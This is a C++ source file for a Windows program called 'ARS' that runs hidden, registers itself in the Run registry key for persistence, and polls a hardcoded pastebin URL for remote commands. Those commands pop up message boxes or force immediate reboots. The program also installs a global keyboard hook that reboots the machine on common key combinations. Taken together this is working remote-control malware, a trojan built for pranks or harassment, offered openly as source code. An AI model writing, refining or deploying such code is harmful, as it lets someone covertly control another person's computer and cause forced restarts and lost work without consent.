#include <iostream>
#include <string>
#include <vector>
#include <curl/curl.h>
#include <sstream>
#include <thread>
#include <chrono>
#include <fstream>
#include <ctime>
#include <windows.h>
#include <shlobj.h>
#include <map>
#include <algorithm>
#include <shellapi.h>
#include <mutex>

#pragma comment(lib, "shell32.lib")
#pragma comment(linker, "/SUBSYSTEM:WINDOWS /ENTRY:mainCRTStartup")


HHOOK hook;

#define _CRT_SECURE_NO_WARNINGS

// Forward declarations
void logCommand(const std::string& command, bool success);
void hideConsoleWindow();
void registerAutoStart();
void setPriority();
void saveExecutedCommands();
void loadExecutedCommands();

std::map<std::string, int> executedCommands;
std::mutex executedCommandsMutex;

bool isConsoleHidden = false;

std::string getStateFilePath()
{
    char appDataPath[MAX_PATH];
    if (!SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appDataPath))) {
        return "";
    }
    
    std::string stateDir = std::string(appDataPath) + "\\ARS";
    CreateDirectoryA(stateDir.c_str(), NULL);
    
    return stateDir + "\\executed_commands.txt";
}

void saveExecutedCommands()
{
    try {
        std::string statePath = getStateFilePath();
        if (statePath.empty()) return;
        
        std::lock_guard<std::mutex> lock(executedCommandsMutex);
        
        std::ofstream stateFile(statePath, std::ios::trunc);
        if (stateFile.is_open()) {
            for (const auto& [cmd, _] : executedCommands) {
                stateFile << cmd << "\n";
            }
            stateFile.close();
            logCommand("STATE: Saved " + std::to_string(executedCommands.size()) + " executed commands", true);
        }
    } catch (...) {
        logCommand("STATE_ERROR: Failed to save state", false);
    }
}

// Load executed commands from persistent storage (on startup)
void loadExecutedCommands()
{
    try {
        std::string statePath = getStateFilePath();
        if (statePath.empty()) return;
        
        std::ifstream stateFile(statePath);
        if (stateFile.is_open()) {
            std::string line;
            int loadedCount = 0;
            
            std::lock_guard<std::mutex> lock(executedCommandsMutex);
            
            while (std::getline(stateFile, line)) {
                if (!line.empty()) {
                    executedCommands[line] = 1;
                    loadedCount++;
                }
            }
            stateFile.close();
            
            logCommand("STATE: Loaded " + std::to_string(loadedCount) + " previously executed commands on startup", true);
        }
    } catch (...) {
        logCommand("STATE_ERROR: Failed to load state", false);
    }
}

// Set process priority to low
void setPriority()
{
    SetPriorityClass(GetCurrentProcess(), BELOW_NORMAL_PRIORITY_CLASS);
    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_BELOW_NORMAL);
}

// Restart using Windows shutdown command
void restart(int times = 1)
{
    // Save state before restarting
    saveExecutedCommands();
    
    for (int i = 0; i < times; i++) {
        logCommand("RESTART: " + std::to_string(times) + " times", true);
        system("shutdown /r /t 0");
        
        if (times > 1) {
            std::this_thread::sleep_for(std::chrono::seconds(5));
        }
    }
}

// Show message box with text
void sayMessage(const std::string& message, int times = 1)
{
    for (int i = 0; i < times; i++) {
        MessageBoxA(NULL, message.c_str(), "ARS", MB_OK | MB_ICONINFORMATION | MB_TOPMOST);
        
        if (times > 1) {
            std::this_thread::sleep_for(std::chrono::milliseconds(500));
        }
    }
}

// Low-level keyboard hook
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode == HC_ACTION &&
        (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN))
    {
        KBDLLHOOKSTRUCT* kb = (KBDLLHOOKSTRUCT*)lParam;

        // CTRL + ESC
        if (kb->vkCode == VK_ESCAPE &&
            (GetAsyncKeyState(VK_CONTROL) & 0x8000))
        {
            restart();
            return 1; // block Start menu
        }

        // SHIFT + HOME
        if (kb->vkCode == VK_HOME &&
            (GetAsyncKeyState(VK_SHIFT) & 0x8000))
        {
            restart();
            return 1;
        }

        // ALT + SPACE
        if (kb->vkCode == VK_SPACE &&
            (GetAsyncKeyState(VK_MENU) & 0x8000))
        {
            restart();
            return 1; // block window menu
        }
    }

    return CallNextHookEx(hook, nCode, wParam, lParam);
}

void hideConsoleWindow()
{
    HWND hWnd = GetConsoleWindow();
    if (hWnd != NULL)
    {
        ShowWindow(hWnd, SW_HIDE);
    }
    isConsoleHidden = true;
}

void registerAutoStart()
{
    HKEY hKey;
    LONG lResult;
    
    char exePath[MAX_PATH];
    if (GetModuleFileNameA(NULL, exePath, MAX_PATH) == 0)
    {
        logCommand("AUTOSTART_ERROR: Failed to get module path", false);
        return;
    }
    
    lResult = RegOpenKeyExA(HKEY_CURRENT_USER,
                            "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                            0,
                            KEY_SET_VALUE,
                            &hKey);
    
    if (lResult == ERROR_SUCCESS)
    {
        lResult = RegSetValueExA(hKey,
                      "ARS",
                      0,
                      REG_SZ,
                      (LPBYTE)exePath,
                      strlen(exePath) + 1);
        
        RegCloseKey(hKey);
        
        if (lResult == ERROR_SUCCESS)
        {
            logCommand("AutoStart registered successfully", true);
        }
        else
        {
            logCommand("AUTOSTART_ERROR: Failed to set registry value", false);
        }
    }
    else
    {
        logCommand("AUTOSTART_ERROR: Failed to open registry key", false);
    }
}

int extractRepeatCount(const std::string& command)
{
    std::istringstream iss(command);
    std::string word;
    std::string lastWord;
    
    while (iss >> word) {
        lastWord = word;
    }
    
    try {
        int count = std::stoi(lastWord);
        return (count > 0) ? count : 1;
    } catch (...) {
        return 1;
    }
}

std::pair<std::string, int> extractSayMessage(const std::string& command)
{
    if (command.length() <= 4) {
        return {"", 1};
    }
    
    std::string remaining = command.substr(4);
    remaining.erase(0, remaining.find_first_not_of(" \t"));
    
    int repeatCount = 1;
    std::string message = remaining;
    
    size_t lastSpace = remaining.find_last_of(" ");
    if (lastSpace != std::string::npos) {
        std::string lastPart = remaining.substr(lastSpace + 1);
        try {
            repeatCount = std::stoi(lastPart);
            message = remaining.substr(0, lastSpace);
        } catch (...) {
            message = remaining;
        }
    }
    
    if (!message.empty() && message.front() == '"' && message.back() == '"') {
        if (message.length() > 2) {
            message = message.substr(1, message.length() - 2);
        }
    }
    
    return {message, repeatCount};
}

size_t WriteCallback(void* contents, size_t size, size_t nmemb, std::string* userp) {
    if (userp != nullptr) {
        userp->append((char*)contents, size * nmemb);
    }
    return size * nmemb;
}

std::string fetchCommands(const std::string& url) {
    CURL* curl = curl_easy_init();
    std::string readBuffer;
    
    if (curl == nullptr) {
        logCommand("CURL_ERROR: Failed to initialize curl", false);
        return "";
    }
    
    curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &readBuffer);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);
    curl_easy_setopt(curl, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64)");
    
    curl_easy_setopt(curl, CURLOPT_FRESH_CONNECT, 1L);
    curl_easy_setopt(curl, CURLOPT_FORBID_REUSE, 1L);
    
    CURLcode res = curl_easy_perform(curl);
    
    if (res != CURLE_OK) {
        logCommand("FETCH_ERROR: " + std::string(curl_easy_strerror(res)), false);
        curl_easy_cleanup(curl);
        return "";
    }
    
    curl_easy_cleanup(curl);
    return readBuffer;
}

std::vector<std::string> parseCommands(const std::string& content) {
    std::vector<std::string> commands;
    std::istringstream stream(content);
    std::string line;
    
    while (std::getline(stream, line)) {
        if (line.empty() || line[0] == '#') {
            continue;
        }
        
        line.erase(0, line.find_first_not_of(" \t\r\n"));
        line.erase(line.find_last_not_of(" \t\r\n") + 1);
        
        if (!line.empty()) {
            commands.push_back(line);
        }
    }
    
    return commands;
}

bool executeCommand(const std::string& command) {
    if (command.empty()) {
        return false;
    }
    
    std::vector<std::string> allowedCommands = {
        "say",
        "restart"
    };
    
    size_t spacePos = command.find(' ');
    std::string cmdName = (spacePos != std::string::npos) 
        ? command.substr(0, spacePos) 
        : command;
    
    bool isAllowed = false;
    for (const auto& allowed : allowedCommands) {
        if (cmdName == allowed) {
            isAllowed = true;
            break;
        }
    }
    
    if (!isAllowed) {
        logCommand("BLOCKED: " + cmdName, false);
        return false;
    }
    
    {
        std::lock_guard<std::mutex> lock(executedCommandsMutex);
        
        if (executedCommands.find(command) != executedCommands.end()) {
            logCommand("SKIPPED: " + command, true);
            return false;
        }
        
        executedCommands[command] = 1;
    }
    
    bool success = false;
    
    if (cmdName == "restart") {
        try {
            int times = extractRepeatCount(command);
            restart(times);
            success = true;
        } catch (...) {
            logCommand("EXCEPTION: restart command", false);
            success = false;
        }
    }
    else if (cmdName == "say") {
        try {
            auto [message, times] = extractSayMessage(command);
            if (!message.empty()) {
                sayMessage(message, times);
                logCommand("SAY: " + message + " (" + std::to_string(times) + "x)", true);
                success = true;
            } else {
                logCommand("ERROR: empty message in say command", false);
                success = false;
            }
        } catch (...) {
            logCommand("EXCEPTION: say command", false);
            success = false;
        }
    }
    
    if (success) {
        logCommand(command, true);
        // Save state after every successful command
        saveExecutedCommands();
        return true;
    } else {
        logCommand(command, false);
        return false;
    }
}

void logCommand(const std::string& command, bool success) {
    try {
        char appDataPath[MAX_PATH];
        if (!SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appDataPath))) {
            return;
        }
        
        std::string logDir = std::string(appDataPath) + "\\ARS";
        CreateDirectoryA(logDir.c_str(), NULL);
        
        std::string logPath = logDir + "\\command_log.txt";
        std::ofstream logFile(logPath, std::ios::app);
        
        if (logFile.is_open()) {
            auto now = std::time(nullptr);
            auto tm = std::localtime(&now);
            char timestamp[100];
            std::strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", tm);
            
            logFile << "[" << timestamp << "] " 
                    << (success ? "SUCCESS" : "FAILED") << " - " 
                    << command << std::endl;
            logFile.close();
        }
    } catch (...) {
    }
}

void startCommandServer(const std::string& commandsUrl, int pollIntervalSeconds = 5) {
    logCommand("ARS Service Started", true);
    logCommand("Using URL: " + commandsUrl, true);
    logCommand("Polling interval: " + std::to_string(pollIntervalSeconds) + " seconds", true);
    
    int failureCount = 0;
    const int MAX_CONSECUTIVE_FAILURES = 10;
    
    while (true) {
        try {
            std::string content = fetchCommands(commandsUrl);
            
            if (!content.empty()) {
                failureCount = 0;
                std::vector<std::string> commands = parseCommands(content);
                
                logCommand("POLL: Fetched " + std::to_string(commands.size()) + " command(s)", true);
                
                for (const auto& cmd : commands) {
                    try {
                        executeCommand(cmd);
                    } catch (...) {
                        logCommand("EXCEPTION: executeCommand failed for: " + cmd, false);
                    }
                }
            } else {
                failureCount++;
                
                if (failureCount > MAX_CONSECUTIVE_FAILURES) {
                    std::this_thread::sleep_for(std::chrono::seconds(pollIntervalSeconds * 2));
                    failureCount = 0;
                    continue;
                }
            }
        } catch (...) {
            failureCount++;
            logCommand("EXCEPTION in command loop", false);
        }
        
        std::this_thread::sleep_for(std::chrono::seconds(pollIntervalSeconds));
    }
}

int main(int argc, char* argv[]) {
    try {
        setPriority();
        hideConsoleWindow();
        registerAutoStart();
        
        // Load previously executed commands from persistent storage
        // This prevents old commands from re-executing after reboot
        loadExecutedCommands();
        
        std::string commandsUrl = "https://pastebin.com/raw/VqqdCTes";
        int pollInterval = 5;
       
        logCommand("Starting with URL: " + commandsUrl, true);
        
        // Start command server in a separate thread
        std::thread serverThread([&]() {
            startCommandServer(commandsUrl, pollInterval);
        });
        serverThread.detach(); // Let it run independently

        // Install keyboard hook
        hook = SetWindowsHookEx(
            WH_KEYBOARD_LL,
            KeyboardProc,
            GetModuleHandle(NULL),
            0
        );

        if (!hook)
        {
            logCommand("Hook installation failed", false);
            return 1;
        }

        logCommand("Keyboard hook installed successfully", true);

        // Message loop (keeps hook alive and prevents program exit)
        MSG msg;
        while (GetMessage(&msg, NULL, 0, 0))
        {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }

        UnhookWindowsHookEx(hook);
    } catch (...) {
        logCommand("EXCEPTION: main function", false);
    }
    
    return 0;
}